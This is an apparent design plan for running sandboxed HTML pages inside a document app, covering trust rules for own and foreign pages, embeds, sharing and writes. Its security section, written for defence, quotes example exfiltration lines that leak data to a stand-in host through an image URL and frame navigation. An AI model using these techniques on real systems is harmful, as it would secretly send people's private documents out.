# Plan: HTML pages

**Status (2026-11-26).** M1 to M4 are built on the `worktree-html-pages` branch. Where it differs from the plan below: a
foreign page allowed to read runs none of its scripts (§1, *Reading plus a way out*), so its reads are only its
`<golem-embed>` elements, and the `golem` API serves own pages only; writes need no prompt for an own page, and each is a
run in Tools › Scripts' log with Undo This Run. Where a page came from follows the account (`documents.outside`, §1), so a page
imported or downloaded on one device is foreign on the person's others too. Not done yet: checking the frame in the real web
views (WKWebView inside Tauri, WebView2, WebKitGTK), a manual screen reader pass of page view, and Download in a shared page's
view. Links in a page whose scripts don't run can't be handed to the app (nothing in the frame can catch the click), so
following one only shows the page again.

**How it works.** `client/src/pages/`: `compose.ts` (what makes a file a page, its metas, the policy, inlining its files,
filling its embeds, the frame's page and the runtime that gives it `golem`), `trust.ts` (own or foreign, and what this
device remembers), `embedHtml.ts` (a live block's result as HTML), `requests.ts` (answering `golem` calls through
`scripts/vault.ts`), `controller.ts` (putting it together and following what it read), `view.ts` (the bar and the frame) and
`dialogs.ts`: one chunk, loaded behind `entry.ts` the first time a page is shown. `detect.ts` and `trust.ts`'s `PageMemory` are
always loaded, since they decide how an HTML file opens. main.ts opens an HTML file as a page (`openPage`, document kind `page`), and View › HTML as Page / as
Document / Source switch (`setHtmlView`). The site's viewer shows a shared page with `viewer/sharedPage.ts`. The server keeps
`documents.outside` (and `saved_by`), the owner's word on it (`PUT /api/documents/:id/outside`), and a page's results
(`/api/documents/:id/page`, `/api/view|public/:token/page`); the desktop shell has `vault_downloaded`. Tests: `client/test/pages.test.ts`, `server/test/pages.test.ts`, `e2e/pages/page-view.spec.ts`,
`e2e/accessibility/page-view.spec.ts`, `e2e/collab/share-page.spec.ts`, and
`downloaded_reads_the_quarantine_mark` in `desktop/src-tauri/src/vault.rs`.

Before this, an `.html` file only opened as a document: `formats/html.ts` reads it into the Word-shaped model, and what the
model cannot hold (`<script>`, `<iframe>`, forms, SVG, stylesheets) is kept as text and written back on export, never run.
That is still what Document shows.

**Goal.** HTML pages that live in the vault and run in the app, in place of pages an agent hosts somewhere else (Claude's
artifacts). A page can show parts of other documents with the same addresses live blocks use
(`Q3 Report.docx#table:Totals`), stays up to date as they change, and can be shared like any document.

**Built on what exists:**

- **The sandbox** of scripts and the viewer ([live-blocks.md](live-blocks.md) §8, *The sandbox*; `script/src/sandbox.ts`,
  `script/src/host.ts`; [Viewer](architecture/viewer.md), *Running it sandboxed*): an iframe with
  `sandbox="allow-scripts"` and no `allow-same-origin`, an opaque origin, a strict Content-Security-Policy, everything
  through `postMessage`.
- **Addresses and results** of live blocks: `splitAddress`, and `resultOf` in `live/sources.ts`, which turns any address
  (a section, a table, a chart, a field, a PDF page, `@list:`, a script's result) into a `LiveResult`.
- **Grants and the graph** of scripts: per-device grants, the first-run prompt, and the vault graph that updates what
  depends on a file when it is saved.

## Principles

1. **Reading is not the risk.** A page the person wrote, or an agent they pointed at their vault wrote, may read the whole
   vault: it can do nothing the person cannot. The risks are where a page came from, reading combined with a way out, and
   authority beyond documents (§1).
2. **Every page is sandboxed, whoever wrote it.** No page ever runs on the app's origin.
3. **A page's code is the page's,** not the documents'. Documents still never carry code (live-blocks principle 2): an
   embed in a page names a source, it does not run one.
4. **No dependencies.** The sandbox, the inliner and the page API are written by hand.

## 1. Security

### What the sandbox stops, for every page

A page on the app's origin would hold the person's session and could call the account's API without asking: delete files,
share or make public links, change settings, reach billing; on the desktop, Tauri's IPC, and through it files outside the
vault. The person does those things on purpose; a page's code would do them silently. So every page, the person's own
included, runs in the opaque-origin frame: no cookies, IndexedDB, local storage or account, no access to the app's
window, and nothing reaches the app except messages the host answers. Before pages ship, check that the frame cannot reach
Tauri's IPC in the real web views (WKWebView, WebView2, WebKitGTK), which scripts' M0 also still owes.

A page draws inside the app's window, so it could imitate the app (a fake sign-in card). Page view gives the frame a
border and a bar the page cannot draw over, naming the file, and the app never asks for a password inside it.

### Where a page came from

"In my vault" is not "mine". Pages arrive from elsewhere:

- **A shared folder.** The serious case. A collaborator's `dashboard.html` in a folder shared with the person would read
  the person's whole vault, including what the collaborator cannot see, the moment it is opened.
- **Attachments, downloads and web clippings.** `.html` attachments are a common phishing carrier.
- **Templates,** and pages copied from the web.

So a page is either **own** or **foreign**, decided by where its bytes came from, not by where it sits:

- **Own:** every save of it came from this account: typed or saved in the app, or written into the vault folder on this
  person's computer, by them or an agent they run.
- **Foreign:**
  - created or changed by another account: an editor's save, a document an editor added to a shared folder, and a room save
    that carried an edit from someone else all set `documents.outside` to 1 on the server ([folder sharing](folder-sharing.md));
    the owner's own saves leave it as it is. The owner's listing then says `byOther: true` (older rows, from before `outside`,
    fall back to `created_by` and `saved_by`), so an editor changing the person's page makes it foreign on every device until
    the person marks it own again;
  - opened or imported from outside the vault (File › Open, a drop, an upload, an email attachment);
  - written into the vault folder with the operating system's download mark (macOS's `com.apple.quarantine`, Windows'
    `Zone.Identifier`), which browsers and mail apps put on what they save. The desktop shell reads it
    (`vault_downloaded`, behind `desktop/bridge.ts`). A shell too old to have that command can't tell (`downloaded()` gives
    null), and that counts as downloaded: on such a shell, a page from the vault folder is foreign until marked.

What one device sees, the account learns: when the app finds that a page the person owns came from outside (imported on this
device, or with the download mark; never for an old shell's "can't tell"), it says so once for those bytes,
`PUT /api/documents/:id/outside {outside: true}` (owner only; `PageMemory` remembers which bytes it reported), so the page is
foreign on the person's other devices too.

**Mark as Mine** (in page view's bar) makes a foreign page own, after showing what it asks for. On this device it keeps the
mark for these bytes (their SHA-256, `fingerprint` in `trust.ts`; a mark kept by an earlier app with another fingerprint no
longer matches, so the page asks again), forgets that the page came from outside, and, if its file had the download mark,
remembers that the person accepted it (`acceptedDownload`), so the mark on the file no longer counts once they edit the page.
In the account it says `{outside: false}`, so their other devices treat it as theirs. A change by another account makes it
foreign again. A page not yet kept (opened from the computer) is marked for this session only (`SessionGrants`), for its
bytes: another file of the same name is not trusted by it. "Allow Once" reads work the same way. This device never forgets a
page that came from outside, or one whose download it accepted, when it trims what it remembers (`trimRecords`).

### Reading plus a way out

A page that reads everything but cannot send anything anywhere is harmless, even if hostile. The danger is the two
together, and the ways out are more than `fetch`:

- the network: `fetch`, XHR, WebSocket, and loading anything by URL (`<img src="https://x/?d=…">`, a stylesheet, a CDN
  script whose address carries the data in its query), a form posted elsewhere, a link the person clicks;
- **writes**: a page that writes a private note's text into a document in a shared folder has sent it out through the app;
- **sharing**: a shared page's results are baked for its readers (§5), and its code chooses what they are.

### The rules

| Page | Reads | Network | Writes |
| --- | --- | --- | --- |
| Own | everything, no prompt | allowed | allowed (M4), with Undo This Run |
| Foreign | nothing until allowed, then only the folders it names, and only through its embeds | none while it may read | none |
| Every page | always sandboxed: never the session, the account's API or the shell's IPC | | |

- **Network** for an own page is a CSP that allows `https:` for scripts, styles, images and fonts, and `connect-src` to the
  hosts the page names (`<meta name="golem-network" content="api.example.com">`). A foreign page that reads nothing gets
  the same; one that has been allowed to read gets `default-src 'none'` beyond its inlined files and `data:`.
- **Scripts** of a foreign page allowed to read don't run at all (`script-src 'none'`, and a frame without
  `allow-scripts`). *Found while building:* a page that runs code can always send what it read away by navigating its own
  frame (`location = 'https://x/?d=' + data`), which no Content-Security-Policy stops, so a policy without the network is
  not enough. The app fills its embeds before showing it, and `<meta http-equiv="refresh">` is taken out of every page.
- **Links out of a foreign page** that may read are opened by the app, which shows the full address and asks first.
- **Forms** post only from an own page in the app (`allow-forms`, `form-action https:`). A foreign page, and every page shown to
  someone it is shared with, gets neither (`PagePolicy.forms`): it could draw a sign-in form under the app's address and post
  what is typed anywhere.
- **Sharing a page** lists the documents its last run read before making a link (§5).

## 2. Showing a page (M1)

- **Page view.** An `.html`, `.htm` or `.xhtml` file opens as a page when it has a `<script>`, a `<golem-embed>` or a
  `golem-*` meta; otherwise it opens as a document, as today. The bar switches between **Page** and **Source** (the text
  editor), and Source shows the same bar above the text, so either way back is one click (`pages/pageBar.ts`, one bar for
  both; `TextView.setHeader` puts it over the editor and starts the text under it). View › HTML as Document (the current reader) is in the menu only: nothing of a page works there, and a page saved
  from it is written again from the document model, so the bar doesn't offer it. *Built:* it first offered all three, and
  Document read as the page breaking. The choice is remembered per file on the device.
- **The frame** is a `srcdoc` iframe as in scripts' sandbox, with the CSP of §1 set by a `<meta http-equiv>` the host puts
  first in `<head>`. The page's own CSP, if any, can only narrow it.
- **Messages.** Each load of the frame gets a new random secret (`RuntimeStart.token`, `newToken`), put in its runtime. Every
  message the runtime sends carries it, and the app takes nothing without it (`frameMessage`); its replies and updates carry it
  too and go only while that load is there. A page that is leaving (`pagehide`) says so, and nothing is answered until it is
  shown again with a new secret. Without this, a document the frame moved on to (a form posted to another site, a script
  setting `location`) would share the frame's window and could ask for the vault in the page's name.
- **Relative files.** An opaque origin cannot fetch from the vault. Before showing a page the host reads every relative
  `src`, `href` and `url()` (`chart.png`, `style.css`, `lib.js`, a CSS `@import`) from the vault, relative to the page's
  folder, and inlines it as a `data:` address, as `collectImages` does for export. An own page reaches the whole vault. A
  foreign page allowed to read gets files from its own folder only (it cannot climb out by `../`); a foreign page not allowed
  to read gets none, since its scripts run with the network and could send them away. *Built:* `.css` and `.js` are text
  documents, so they sync and inline on every device. The frame is a `srcdoc` frame, which takes on its parent's
  Content-Security-Policy as well as its own: the site and the desktop app set none today, and one added later must leave
  room for pages.
- **Links.** A link to a vault file (a relative path, a `doc:` address) is posted to the app, which opens it in Golem Docs.
  A link to the web opens in a new tab (with the prompt of §1 for a foreign page that may read). `target`, `window.open`
  and top navigation are not allowed (`allow-popups` and `allow-top-navigation` are off).
- **Reloading.** A save of the page, or of a file it inlined, reloads the frame, keeping its scroll position.
- **Accessibility.** The frame is ordinary HTML, so screen readers read it; the bar is an F6 region; Escape moves focus
  from the frame to page view's region (not onto one of the bar's buttons, where a page could otherwise put the person's next
  key).

## 3. Embedding documents (M2)

Two ways in, both resolved by the host through `resultOf`:

- **Declarative:** `<golem-embed src="Q3 Report.docx#table:Totals"></golem-embed>`. The host fills it before showing the
  page and again on each change: a table or blocks as HTML (`documentToHtml`, with the document's styles), a picture,
  chart, drawing or PDF page as an `<img>` with a `data:` PNG, or a drawing as an `<img>` of its SVG (never inline: an SVG from
  anyone could hold a script), a value as text. A document's links that would run code (`javascript:`, `vbscript:`,
  `data:`) are made inert (`safeLinks`); the HTML writer escapes everything else and leaves out what it keeps verbatim. Options after `?` work
  as in live blocks (`Books/?where=status:read&sort=-finished`). An error shows in place with its reason. This covers most
  dashboards without code.
- **Script API:** a small `golem` object the host puts in the frame, the same vocabulary as `@golemdocs/script`'s
  `ScriptApi`: `golem.read(address)`, `golem.notes(folder)`, `golem.sheet(address)`, `golem.result('Scripts/x.ts')`,
  `golem.on('change', fn)`. Every call is a message the host checks against the page's grant (§1); a read outside it
  rejects.
- **What a page reads** is declared, for foreign pages, by `<meta name="golem-reads" content="Books/, Work/Reports/">`. The
  first open asks ("dashboard.html, from Ann, wants to read Books/ and Work/Reports/"), with Allow Once and Always Allow,
  as for scripts. An own page needs no meta.
- **Live updates.** A page is a node in the vault graph: its dependencies are what its last run actually read, as for
  scripts. When one is saved, embeds are filled again and `change` fires. A page in a closed tab is not updated (nothing is
  written to it); it reads fresh results when opened.

## 4. Agents (with M1)

Pages are written by agents in the vault folder, so they need to know the format:

- `desktop/agentGuide.ts` describes pages: `<golem-embed>`, the `golem` API, the metas, the network rules, and that
  relative files are inlined.
- The automation API (`window.golem`, [Automation](architecture/automation.md)) gets page view: which view a file is in,
  the frame's text, the embeds and their errors, so e2e tests and agents can check a page.

## 5. Sharing (M3)

A shared page (Can view, or the public link, `/view?p=`) opens in page view in the viewer, in the same frame. Its readers
cannot reach the owner's vault, so a shared page is **baked**: when the owner saves it or shares it, the owner's app runs
it, resolves every embed and every read it made, and stores the results with the page (an extension of the stored file,
never the vault's `.html`). The viewer answers the page's `golem` calls from the baked results only, and follows saves as
it does today. *Built:* the results are `/api/documents/:id/page`, which only the owner may write (an editor's would be their
own vault's); nothing is kept when the page read an encrypted document (`readsAny` in `keepResults`), since the results are
plain text on the server. The page runs with an own page's policy but no forms.

- **Before sharing,** File › Share lists the documents the last run read ("This page shows parts of 6 documents: …"). A
  page shared publicly publishes them.
- **Calls the bake did not see** reject in the viewer, as a read outside a grant does.
- **Inside a shared folder,** a page's embeds resolve only against the folder's files, as links do (folder-sharing.md,
  *Links stop at the folder*).
- *Later, if baking is not enough:* the server resolves a reader's reads within the page's grant and the folder. That puts
  sources on the server, against "No cloud" in live-blocks §8, so it waits for a real need.

## 6. Writes (M4)

Own pages may edit documents through the actions path of scripts: operations checked against the grant, applied together
as one change credited to the page, in the run log, with Undo This Run. Foreign pages never write. A write into a shared
folder is a way out (§1), so a page that has read outside a shared folder and writes into it asks first.

## Milestones

- **M1:** page view, the frame and its CSP, own and foreign, inlining, links, the agent guide, the automation API, e2e in
  `e2e/pages/` (the frame cannot reach the app, storage, cookies or the network beyond its CSP, in Chromium and WebKit).
  Checked in the real web views before release.
- **M2:** `<golem-embed>`, the `golem` API (reads), grants for foreign pages, the graph and live updates.
- **M3:** baking, sharing and public links, the read list in the Share dialog.
- **M4:** writes for own pages.

## Open questions

- **Libraries from CDNs.** Agents' pages load Chart.js, D3 or Mermaid from a CDN. Own pages may (they have the network);
  foreign pages that read may not. Bundling a few common libraries for pages to use offline would add to the site's size
  (and needs approval as dependencies), so it waits to see what pages actually use.
- **Download marks on other platforms.** Linux has no common mark; iOS's vault is written only by the app and the Files
  app. On those, files from disk count as own.
- **Mobile.** Page view on a phone: the same frame, but pages written for a desktop width may need a "fit width" view.
- **Memory.** As for scripts, a frame cannot be capped, so a page can exhaust memory and crash the app.
